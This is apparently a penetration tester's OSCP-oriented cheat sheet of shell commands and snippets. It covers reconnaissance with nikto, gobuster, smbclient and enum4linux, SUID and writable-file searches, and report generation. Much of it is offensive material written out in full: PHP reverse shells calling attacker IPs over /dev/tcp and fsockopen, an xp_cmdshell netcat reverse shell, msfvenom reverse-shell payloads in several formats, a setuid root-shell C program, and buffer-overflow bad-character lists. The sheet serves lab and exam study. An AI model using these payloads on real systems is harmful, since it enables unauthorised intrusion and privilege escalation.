# Upgrade a TTY shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Search for files owned by root but writeable by current user
find / -xdev -user root -perm -o+w -type f 2>/dev/null

# Numerically sort a list of IP addresses
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 smb-boxes.txt

# Find SUID0 Binaries
find / -perm /4000 2>/dev/null

# Nikto commands

nikto -host 192.168.1.164 -output 192.168.1.164_80_nikto.txt

# SMB Commands
smbclient -L \\\\RED -I 10.1.1.129 -U "" -N

smbclient \\\\RED\\kathy -I 10.1.1.129 -U "" -N

enum4linux -a 10.1.1.129 | tee enum4linux_output.txt

# GoBuster commands
gobuster -u http://192.168.1.164 -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,204,301,302,307,403,500 -e -o gobuster-web-common-output.txt

gobuster -u http://192.168.1.164/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200,204,301,302,307,403,500 -e -o gobuster-web-cgis-output.txt

gobuster -u http://192.168.1.164/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,204,301,302,307,403,500 -e -o gobuster-dir2.3med-output.txt

gobuster -u http://192.168.1.164 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200,204,301,302,307,403,500 -x php -e -o gobuster-dir2.3med-php-output.txt

# Fix BurpSuite errors when communicating with old machines
java -Djsse.enableSNIExtension=false -jar /usr/bin/burpsuite

# PHP reverse shell using bash
## Used on a VM when php-reverse-shell.php didn't work
<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.141/443 0>&1");?>

## Used on Zico for phpliteadmin
<?php $sock=fsockopen("192.168.1.141",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>

# Take screenshots in format YY-MM-DD_HH-MM-SS, e.g. kali-screenshot-20-05-12_20-27-13
gnome-screenshot -f /mnt/hgfs/vm_share/kali-screenshots/kali-screenshot-$(date +%y-%m-%d_%H-%M-%S).png

# Take screenshots without screen blinking
import -window root "/mnt/hgfs/vm_share/kali-screenshots/kali-screenshot-$(date +%y-%m-%d_%H-%M-%S).png"

# Parse nslookup files
cat dns-lookups.txt | sort -u | cut -f1 | cut -d\. -f 1,2,3,4| awk -F. '{print $4"."$3"." $2"."$1}' > ipsonly
cat dns-lookups.txt | sort -u | cut -f2 | cut -d" " -f 3 | cut -d\. -f1-3 > namesonly

# Use xp_cmdshell extended procedure to spawn a shell
exec xp_cmdshell 'nc.exe -e cmd.exe 10.11.0.41 443'
go;

# Determine build information of windows
Based on https://superuser.com/questions/363018/how-do-i-tell-what-version-and-edition-of-windows-is-on-the-filesystem you can find the Windows Version and Service pack in C:\Windows\System32\license.rtf for Windows 7. For Windows XP the information is in C:\Windows\System32\eula.txt. For Windows 10 licenses.rtf does not contain the version. Instead it contains the EULA code, which you can use to find the version online.

# Aliases for screenshots and copying stdout to clipboard
alias clip="xclip -i -sel p -f | xclip -i -sel c"

# Mount vm_share
sudo vmhgfs-fuse -o nonempty -o allow_other .host:/vm_share /mnt/vm_share

# Generate lab report
rm OSCP-OS-XXXXX-Lab-Report.pdf ; pandoc OSCP-OS-XXXXX-Lab-Report.md -o OSCP-OS-XXXXX-Lab-Report.pdf --from markdown+yaml_metadata_block+raw_html --template eisvogel --table-of-contents --toc-dept 6 --number-sections --top-level-division=chapter --highlight-style breezedark

# Generate exam report
rm OSCP-OS-XXXXX-Exam-Report.pdf ; pandoc OSCP-OS-XXXXX-Exam-Report.md -o OSCP-OS-XXXXX-Exam-Report.pdf --from markdown+yaml_metadata_block+raw_html --template eisvogel --table-of-contents --toc-dept 6 --number-sections --top-level-division=chapter --highlight-style breezedark

# Print unique list of pwnt machines
find . -name proof.txt | cut -d\/ -f 2 | sort -Vu

# Run LinEnum.sh and output report, t for slow tests
./linenum.sh -r linenum-output.txt
./linenum.sh -t -r linenum-output-thorough.txt

# Linux Exploit Suggester Usage
victim-host$ dpkg -l > pkgsListing.txt
pentester-host$ ./les.sh --uname "<uname-a-from-victim>" --pkglist-file pkgsListing.txt
rpm -qa
https://www.prodefence.org/linux-exploit-suggester-linux-privilege-escalation-auditing-tool/
    $ (uname -s; uname -m; uname -r; uname -v) | curl -s https://api-ksplice.oracle.com/api/1/update-list/ -L -H "Accept: text/text" --data-binary @- | grep CVE | tr ' ' '\n' | grep -o -E 'CVE-[0-9]+-[0-9]+' | sort -r -n | uniq

# Spawn SYSTEM shell with psexec
psexec -i -s cmd.exe

# Bad characters

```python
badchars = (
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a"
"\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15"
"\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b"
"\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36"
"\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
"\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57"
"\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d"
"\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83"
"\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e"
"\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99"
"\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4"
"\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba"
"\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5"
"\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb"
"\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6"
"\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1"
"\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc"
"\xfd\xfe\xff")
```

# Generate msfvenom shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=9001 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -n 16 -f python

msfvenom -p windows/shell_reverse_tcp -f exe-service -o payload.exe LHOST=10.11.0.41 LPORT=9001
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f raw > shell.jsp
msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f war > reverse_shell.war
msfvenom -p php/reverse_php LHOST=10.11.0.33 LPORT=443 > /var/www/html/evil.txt
msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > staged-shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > non-staged-shell.elf

# Generate bad characters
```python
#!/user/bin/python
import sys
for x in range(0,256):
    sys.stdout.write("\\x" + '{:02x}'.format(x))
```

# SUID0 Binary

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setuid(0); setgid(0); system("/bin/bash");
}
```

# Mark binary as SUID0
chown root:root /dev/shm/suid-shell ; chmod 7775 /dev/shm/suid-shell

# Recursive icacls search with powershell
Get-ChildItem C:\temp\ -Recurse | Get-Acl | grep "Everyone"

# AutoRecon
python3 /opt/AutoRecon/src/autorecon.py -ct 2 -cs 2 -t TARGET_FILE --only-scans-dir

